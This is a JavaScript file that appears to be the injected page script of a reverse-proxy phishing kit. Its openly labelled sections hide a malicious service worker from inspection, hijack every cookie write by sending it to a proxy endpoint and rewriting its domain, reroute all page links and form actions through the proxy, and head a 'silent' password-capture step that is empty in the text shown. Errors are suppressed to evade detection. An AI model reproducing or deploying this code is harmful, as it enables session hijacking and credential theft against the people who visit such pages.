// ============================================================
// DOM script with all logs silenced
// ============================================================

// ---- 1. Hide Service Worker ----
(function () {
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {
                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;
    navigator.serviceWorker.getRegistrations = function () {
        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {
                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                })
            });
    };
})();

// ---- 2. Cookie Hijack ----
(function () {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor,
        get() {
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false);
                xhr.setRequestHeader("Content-Type", "text/plain");
                xhr.send(cookie);

                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";

                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {
                    let attribute = cookieAttribute.trim();
                    if (attribute) {
                        const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
                        if (cookieDomainMatch) {
                            const cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = `Domain=${self.location.hostname}`;
                            }
                        }
                        modifiedCookie += `${attribute}; `;
                    }
                }
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            } catch (error) {
                // silent
            }
        }
    });
})();

// ---- 3. MutationObserver for href/action rewriting ----
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        } else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];
observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    } catch { }
}

// ---- 4. DOM Password Capture (silent) ----
